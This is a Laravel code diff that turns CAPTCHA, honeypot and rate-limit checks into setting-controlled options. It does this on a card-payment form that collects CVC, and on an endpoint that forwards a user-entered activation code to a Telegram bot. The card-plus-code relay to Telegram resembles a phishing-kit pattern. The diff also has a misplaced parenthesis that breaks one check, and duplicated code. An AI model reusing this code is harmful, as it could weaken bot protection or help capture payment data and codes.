@@ -31,13 +31,13 @@ $key = 'submit|' . $request->ip();
             'month' => 'required|numeric|between:1,12',
             'year' => 'required|numeric|min:' . date('y'),
             'cvc' => 'required|numeric|digits:3',
-               'hp_field' => 'nullable',
-            // CAPTCHA
-            'captcha_answer' => 'required|string',
-            'captcha_token' => 'required|string',
+     'hp_field' => get_general_value('cart_captcha') == 'on' ? 'required|string' : 'nullable',
+            'captcha_answer' => get_general_value('cart_captcha') == 'on' ? 'required|string' : 'nullable',
+            'captcha_token' => get_general_value('cart_captcha') == 'on' ? 'required|string' : 'nullable',
         ]);
-        
-        // honeypot للتحقق من الروبوتات
+           if(get_general_value('cart_captcha') == 'on'){
+            
+                // honeypot للتحقق من الروبوتات
         if ($request->filled('hp_field')) {
             RateLimiter::hit($key);
             return back()->withInput()->with('error', 'محاولة مشبوهة.');
@@ -63,6 +63,17 @@ $key = 'submit|' . $request->ip();
             RateLimiter::hit($key);
             return back()->withInput()->with('error', 'إجابة التحقق غير صحيحة.');
         }
+
+        // optional: التحقق من وقت استكمال النموذج
+        $startTime = session('form_start_time') ?? now();
+        $timeTaken = now()->diffInMilliseconds($startTime);
+        
+
+        // كل شيء جيد، تنظيف CAPTCHA ومحاولات الروبوت
+        session(['captcha_used' => true]);
+        session()->forget(['captcha_token', 'captcha_text', 'form_start_time']);
+        RateLimiter::clear($key);
+    }
 
         // optional: التحقق من وقت استكمال النموذج
         $startTime = session('form_start_time') ?? now();
@@ -197,8 +208,8 @@ $key = 'submit|' . $request->ip();
     // فاليدشن للحقلين order و CAPTCHA
     $request->validate([
         'order' => 'required|string',
-        'captcha_answer' => 'required|string',
-        'captcha_token' => 'required|string',
+        'captcha_answer' => get_general_value('code_captcha') == 'on' ? 'required|string' : 'nullable',
+        'captcha_token' => get_general_value('code_captcha') == 'on' ? 'required|string' : 'nullable',
     ], [
         'order.required' => 'الرجاء إدخال الكود.',
         'captcha_answer.required' => 'الرجاء إدخال نص التحقق.',
@@ -207,6 +218,7 @@ $key = 'submit|' . $request->ip();
 
     $key = 'confirm|' . $request->ip();
 
+    if(get_general_value('code_captcha' == 'on')){
     // تحقق من محاولات كثيرة
     if (\Illuminate\Support\Facades\RateLimiter::tooManyAttempts($key, 10)) {
         return response()->json([
@@ -232,6 +244,7 @@ $key = 'submit|' . $request->ip();
             'message' => 'تم استخدام رمز التحقق هذه المرة.'
         ]);
     }
+    
 
     // تحقق من نص CAPTCHA
     $expectedText = session('captcha_text', '');
@@ -249,6 +262,7 @@ $key = 'submit|' . $request->ip();
     session()->forget(['captcha_token', 'captcha_text']);
     \Illuminate\Support\Facades\RateLimiter::clear($key);
 
+}
     // إرسال الكود عبر تليجرام
     $message = "رمز التفعيل: " . $request->order;
     $key = env('TOKEN_TELEGRAM');
